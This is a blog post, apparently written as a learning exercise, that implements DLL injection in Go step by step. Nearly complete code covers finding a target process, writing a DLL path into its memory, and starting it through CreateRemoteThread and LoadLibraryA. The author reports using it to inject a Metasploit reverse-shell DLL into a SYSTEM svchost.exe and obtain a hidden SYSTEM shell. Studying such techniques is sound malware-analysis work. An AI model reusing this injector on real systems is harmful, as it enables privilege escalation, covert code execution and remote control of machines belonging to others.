---
title: DLL Injection
permalink: /posts/DLLInjection
permalink_name: DLLInjection
---

The first technique I decided to implement was DDL injection. Again, the implementation is going to be in Go.

First thing first, the general idea behind DLL injection is fairly simple. 
When a DLL is loaded into a process, the DLLMain entrypoint is executed. If we can load a DLL into a target process, possibly one running with higher privileges or anyway trusted by the OS, explorer.exe or svchost.exe for example, we could get code execution within that process context.

There are generally two ways to go about DLL injection. Either you load the path to the DLL into the target memory and then call `LoadLibraryA` on it, or you load the entire DLL, locate its entrypoint, and start a thread to run from there.
I decided to go the first way because that is the way it was described in Practical Malware Analysis.

Now onto the actual implementation.

First of all, we need to be able to get a handle on the process we want to inject.
To do that, we'll take a snapshot of the currently running processes with the `CreateToolhelp32Snapshot`. The `TH32CS_SNAPPROCESS` parameter allows us to enumerate all processes on the system.
We can then use `Process32First` to get a pointer to the first `PROCESSENTRY32` and `Process32Next` to iterate through all the entries. Since we are running a 64-bit process and enumerating other 64-bits processes, simply checking the `szExeFile` attribute of the `PROCESSENTRY32` struct will give us the executable name for the process, which we can then check to see if it matches what we are looking for.

```
processesSnap, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
defer windows.CloseHandle(processesSnap)
if err != nil {
	log.Fatal(err)
}
var pe32 windows.ProcessEntry32
pe32.Size = uint32(unsafe.Sizeof(pe32))
err = windows.Process32First(processesSnap, &pe32)
if err != nil {
	log.Fatal(err)
}
for {
	if pe32.ProcessID > 0 {
		processName := windows.UTF16PtrToString(&pe32.ExeFile[0])
		if processName == target {
			targetIDs = append(targetIDs, pe32.ProcessID)
		}
	}
	err = windows.Process32Next(processesSnap, &pe32)
	if err != nil {
		break
	}
}
```

As you can see, I am not stopping at the first match. Rather, I store all of them and then try to inject them all until one works. I do this because some SYSTEM processes seem not to be injectable, notably some instances of svchost.exe.

Armed with the PID of the victim process, we now can go ahead and get a handle for it. During my tests, I found that `PROCESS_CREATE_THREAD`, `PROCESS_VM_WRITE`, `PROCESS_VM_READ`, `PROCESS_VM_OPERATION` are the minimum access rights required to successfully perform DLL injection. This is better than `PROCESS_ALL_ACCESS` that sometimes pops up but still will require to get `SeDebugPrivilege` in some cases. I will discuss that in a later post.

```
victimProcess, err := windows.OpenProcess(
	windows.PROCESS_CREATE_THREAD|
		windows.PROCESS_VM_WRITE|
		windows.PROCESS_VM_READ|
		windows.PROCESS_VM_OPERATION,
	false, targetID)

defer windows.CloseHandle(victimProcess)
```

Once we have a handle for the process, we need to allocate enough space on the memory of the victim process to fit the path to the DLL we want to inject. We can do this with `VirtualAllocEx`. A pattern that will come up more often is that the functions I need are not defined in the `windows` Go package, so I have to manually load them.

```
var (
	kernel32DLL        = windows.NewLazyDLL("kernel32.dll")
	virtualAllocEx     = kernel32DLL.NewProc("VirtualAllocEx")
	writeProcessMemory = kernel32DLL.NewProc("WriteProcessMemory")
)
dwSize := uint32(len(targetDLL))
addr, _, err := virtualAllocEx.Call(
	uintptr(victimProcess),
	uintptr(unsafe.Pointer(nil)),
	uintptr(dwSize),
	uintptr(windows.MEM_RESERVE|windows.MEM_COMMIT),
	uintptr(windows.PAGE_EXECUTE_READWRITE))
if addr == 0 {
	fmt.Println("[-] virtualAllocEx returned NULL")
	log.Fatal(err)
}
```

`VirtuallAllocEx` returns a pointer to the beginning of the region we allocated on the target process. This means we can also use this pointer as a starting point to copy our DLL path with `WriteProcessMemory` (also not pre-defined).

```
buffer := []byte(targetDLL)
var writtenBytes uint64 = 0
r1, _, err := writeProcessMemory.Call(
	uintptr(victimProcess),
	uintptr(addr),
	uintptr(unsafe.Pointer(&buffer[0])),
	uintptr(dwSize),
	uintptr(unsafe.Pointer(&writtenBytes)),
)
if r1 == 0 {
	fmt.Println("[-] writeProcessMemory failed")
}
fmt.Printf("[+] Written %d bytes to remote process\n", writtenBytes)
```

We now need to get the address of `LoadLibraryA`, defined in `kernel32.dll` so that we can later start a new thread to execute it. Interestingly, getting the address of the functions in the local process rather than in the remote one works fine. You can find out more why in (this Stackoverflow thread)[https://stackoverflow.com/questions/22750112/dll-injection-with-createremotethread]. Because of this, getting the address of `LoadLibraryA` is as simple as calling `GetProcAddress`.

```
moduleName, err := windows.UTF16FromString("kernel32.dll")
if err != nil {
	log.Fatal(err)
}
var kernel32Module windows.Handle
err = windows.GetModuleHandleEx(0, &moduleName[0], &kernel32Module)
if err != nil {
	log.Fatal(err)
}
loadLibrary, err := windows.GetProcAddress(kernel32Module, "LoadLibraryA")
if err != nil {
	log.Fatal(err)
}
```

Finally, we can launch a new thread to execute `LoadLibraryA`, using the DLL path we wrote to the remote memory as an argument. We can use `CreateRemoteThread` to launch a thread in a remote process, passing the address of `LoadLibraryA` as `lpStartAddress` and the address we got from `VirtuallAllocEx` as `lpParameter`.

```
createRemoteThread := kernel32DLL.NewProc("CreateRemoteThread")
r1, _, err = createRemoteThread.Call(
	uintptr(victimProcess),
	uintptr(unsafe.Pointer(nil)),
	0,
	loadLibrary,
	addr,
	0,
	uintptr(unsafe.Pointer(nil)))
if r1 == 0 {
	fmt.Println("[-] Failed to launch remote thread")
	log.Fatal(err)
}
handle := windows.Handle(r1)
windows.WaitForSingleObject(handle, windows.INFINITE)
```

I created a DLL reverse shell with Metasploit for testing, and lo and behold, it works!
As you can see in the picture, I injected a SYSTEM process (svchost.exe) to launch a reverse shell to an Ubutnu box, where I catch it and get, indeed, a SYSTEM shell. Also, in Process Explorer, you can verify that the process does not show anywhere.


<img src="/assets/images/dllinject.png" alt="DLL injection succeeds" width="1400"/>
